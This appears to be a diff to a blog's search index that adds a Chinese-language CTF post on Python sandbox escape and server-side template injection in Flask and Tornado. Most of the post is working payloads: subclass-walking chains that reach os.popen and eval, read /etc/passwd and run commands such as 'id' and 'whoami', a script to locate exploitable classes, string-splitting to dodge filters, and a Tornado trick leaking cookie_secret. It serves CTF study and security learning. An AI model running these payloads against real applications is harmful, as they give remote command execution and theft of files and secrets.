@@ -54,6 +54,31 @@
     
     
     <entry>
+      <title>python沙盒逃逸</title>
+      <link href="/posts/ed9dc04e/"/>
+      <url>/posts/ed9dc04e/</url>
+      
+        <content type="html"><![CDATA[<h2 id="python2"><a href="#python2" class="headerlink" title="python2"></a>python2</h2><p>两个重要的类，一般都会用到</p><pre><code class="python">In [44]: object.__subclasses__()[59]Out[44]: warnings.catch_warningsIn [45]: object.__subclasses__()[40]Out[45]: file</code></pre><h3 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h3><pre><code class="python">().__class__.__bases__[0].__subclasses__()[40](&#39;filename&#39;).readlines()().__class__.__mro__[1].__subclasses__()[40](&#39;filename&#39;).readlines()</code></pre><p>如图</p><p><img src="/posts/ed9dc04e/1582442823657.png" alt></p><pre><code class="python">().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals[&#39;linecache&#39;].getlines(&#39;/etc/passwd&#39;)</code></pre><p><img src="/posts/ed9dc04e/1582444265686.png" alt></p><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><pre><code class="python">().__class__.__base__.__subclasses__()[59].__init__.func_globals.values()[13][&#39;eval&#39;]</code></pre><p><img src="/posts/ed9dc04e/1582443624642.png" alt></p><pre><code class="python">().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__(&#39;func_global&#39;+&#39;s&#39;)[&#39;linecache&#39;].__dict__[&#39;o&#39;+&#39;s&#39;].__dict__[&#39;popen&#39;](&#39;l&#39;+&#39;s&#39;).read()#也可以写成().__class__.__bases__[.__subclasses__()[59].__init__.func_globals[&#39;linecache&#39;].__dict__[&#39;os&#39;].popen(&#39;ls&#39;).read()# 等价于object.__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#39;id&#39;).read()</code></pre><p><img src="/posts/ed9dc04e/1582446827696.png" alt></p><p>可以使用 <code>__getattribute__</code> 获得属性， <code>__dict__</code></p><p>寻找可以利用的模块</p><pre><code class="python">search = &#39;os&#39;   #也可以是其他你想利用的模块num = -1for i in ().__class__.__bases__[0].__subclasses__():    num += 1    try:        keys = i.__init__.__globals__.keys()        if search in keys:            print(i, num)    except:        pass &#39;&#39;&#39;(&lt;class &#39;site._Printer&#39;&gt;, 71)(&lt;class &#39;site.Quitter&#39;&gt;, 76)(&lt;class &#39;socket._socketobject&#39;&gt;, 124)...&#39;&#39;&#39;</code></pre><p>比如</p><p><img src="/posts/ed9dc04e/1582443247342.png" alt></p><p>来自其他师傅的</p><pre><code class="python">object.__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;)object.__subclasses__()[59].__init__.__globals__.__builtins__.eval(&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;)object.__subclasses__()[59].__init__.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;id&#39;).read()object.__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;os&#39;).popen(&#39;id&#39;).read()</code></pre><h2 id="py2和3通吃"><a href="#py2和3通吃" class="headerlink" title="py2和3通吃"></a>py2和3通吃</h2><pre><code class="python">search = &#39;__builtins__&#39;   #也可以是其他你想利用的模块num = -1for i in ().__class__.__bases__[0].__subclasses__():    num += 1    try:        keys = i.__init__.__globals__.keys()        if search in keys:            print(i, num)    except:        pass </code></pre><p>python2 举例</p><pre><code class="python">().__class__.__bases__[0].__subclasses__()[60].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&quot;)</code></pre><p><img src="/posts/ed9dc04e/1582446435900.png" alt></p><p>python3</p><pre><code class="python">().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&quot;)</code></pre><p><img src="/posts/ed9dc04e/1582443435704.png" alt></p><h2 id="python3-读文件"><a href="#python3-读文件" class="headerlink" title="python3 读文件"></a>python3 读文件</h2><pre><code class="python">In [64]: &quot;&quot;.__class__.__bases__[0].__subclasses__()[127]Out[64]: os._wrap_close&quot;&quot;.__class__.__bases__[0].__subclasses__()[127].__init__.__globals__[&#39;popen&#39;](&#39;cat /etc/&#39;+&#39;passwd&#39;).read()</code></pre><p>i春秋比赛的一道题的payload</p><pre><code class="python">{{"".__class__.__bases__[0].__subclasses__()[127].__init__.__globals__['po'+'pen']('cat this_is_the_fl'+'ag.txt').read()}}# waf 拦截了 popen 和 flag</code></pre><h2 id="flask-SSTI"><a href="#flask-SSTI" class="headerlink" title="flask SSTI"></a>flask SSTI</h2><p>常用的</p><pre><code class="python">{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}</code></pre><h3 id="request对象"><a href="#request对象" class="headerlink" title="request对象"></a>request对象</h3><p> 这个对象指的是当前请求对象，<code>request.environ</code>对象是一个与服务器环境相关的对象字典。值得一提的是，可以通过访问<code>request.args.get</code> <code>request.cookies</code> <code>request.headers</code>等访问我们的请求参数，这主要是用来绕过过滤。（比如不让输入某关键字，我们就可以通过cookies传入，然后从request.cookies获取即可）</p><h3 id="config对象"><a href="#config对象" class="headerlink" title="config对象"></a>config对象</h3><p> config对象是当前配置对象，是一个类字典的对象，可以用<code>config.items()</code>来访问。而且它还有一些独特1的方法，<code>from_envvar</code>, <code>from_object</code>, <code>from_pyfile</code> 。<code>from_pyfile</code>可以读取指定python文件编译并加载进来。</p><h2 id="tornado-SSTI"><a href="#tornado-SSTI" class="headerlink" title="tornado SSTI"></a>tornado SSTI</h2><p>护网杯2018的一道题</p><p><img src="/posts/ed9dc04e/1582507995702.png" alt></p><p>然后我们通过 <code>{{handler.settings}}</code>来获得 cookie_secret</p><p><img src="/posts/ed9dc04e/1582508041772.png" alt></p><p>最后得到 flag</p><pre><code>http://efc64735-8171-468a-b0eb-98510cefe54d.node3.buuoj.cn/file?filename=/fllllllllllllag&amp;filehash=5af68d1f8101c8a5cea67790540f1a1e</code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> python </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>命令执行绕过技巧</title>
       <link href="/posts/58281de6/"/>
       <url>/posts/58281de6/</url>
